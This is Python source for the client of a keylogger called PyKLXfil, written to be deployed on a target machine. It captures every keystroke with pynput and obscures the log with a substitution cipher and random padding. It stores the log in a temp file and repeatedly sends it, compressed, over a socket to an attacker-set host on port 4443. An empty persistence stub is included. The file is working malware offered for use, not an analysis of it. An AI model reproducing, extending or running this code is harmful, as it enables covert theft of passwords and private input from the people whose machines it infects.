#PyKLXfil client to be deployed on target
#### CLIENT ####
# -*- coding: utf-8 -*-
#Auther: 2021, Mayed Alm
import os
import socket
import random
import logging
import tempfile
import threading
from time import sleep
from gzip import compress
from pynput.keyboard import Listener


class PyKLXfilClient:
 
    def __init__(self):
        #The host/IP and port the PyKLXfill server is running on
        ###Edit with your server's IP/Domain and port.###
        self.host = ''
        self.port = 4443
        self.Listener = Listener
        self.letters = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        if os.name == 'nt':
            self.log = tempfile.gettempdir() + '\\'
        elif os.name == 'posix':
            self.log = tempfile.gettempdir() + '/'        
        self.file = self.log + "log"+str(random.randint(10000,99999))+".log"
        logging.basicConfig(filename=self.file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


    def persist():
        #persistence
        pass

    #function to perform basic substitution cipher
    def substitution(self, str):
        Table = str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk\\lmnopqrstuvwxyz0123456789+/!@#$%^&*()-_=][.,'",\
                              "01234567ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv\\wxyz/+89%^&*()$.,#@!-'[]=_")
        return str.translate(Table)

    #logging function
    def on_press(self, key):
        if str(key).startswith("Ke"): #detect if pressed key is special keyboard key
            logging.info(''.join(random.choice(self.letters) for i in range(10))+self.substitution(str(key)+''.join(random.choice(self.letters) for i in range(10))))
        else:
            logging.info(''.join(random.choice(self.letters) for i in range(10))+self.substitution(str(key)[1]+''.join(random.choice(self.letters) for i in range(10))))

    def routine(self):
        with open(self.file, "w") as f:
            f.write("") #clean the file
        size = os.path.getsize(self.file)
        sizeKB = size >> 10 # right shift by 10 to get size in KB
        while sizeKB < 10:
            size = os.path.getsize(self.file)
            sizeKB = size >> 10 # right shift by 10 to get size in KB
            if sizeKB > 3:
                try:
                    self.sender()
                except:
                    sleep(5)
                    continue
            else:
                sleep(5)


    def sender(self):
        SEPARATOR = "-"
        BUFFER_SIZE = 4096 # send 4096 bytes each time step
        filename = self.file
        filesize = os.path.getsize(filename)
        s = socket.socket()
        s.connect((self.host, self.port))
        # send the filename and filesize
        s.send(compress(f"{self.substitution(filename)}{SEPARATOR}{filesize}\n".encode()))
        # start sending the file
        with open(filename, "rb") as f:
                # read the bytes from the file
            bytes_read = compress(f.read(BUFFER_SIZE))
            if not bytes_read:
                # file transmitting is done
                self.routine()
                # we use sendall to assure transimission in 
                # busy networks
            s.sendall(bytes_read)
            s.close()
            sleep(0.5)
            self.routine()


    def main_threads(self):
        th = threading.Thread(target=self.routine)
        listener = self.Listener(on_press=self.on_press)
        th.daemon = True
        th.start()
        listener.start()
        try:
            while listener.is_alive() and th.is_alive():
                sleep(1)
        except KeyboardInterrupt:
            listener.stop()

if __name__ == '__main__':
    run = PyKLXfilClient()
    run.main_threads()
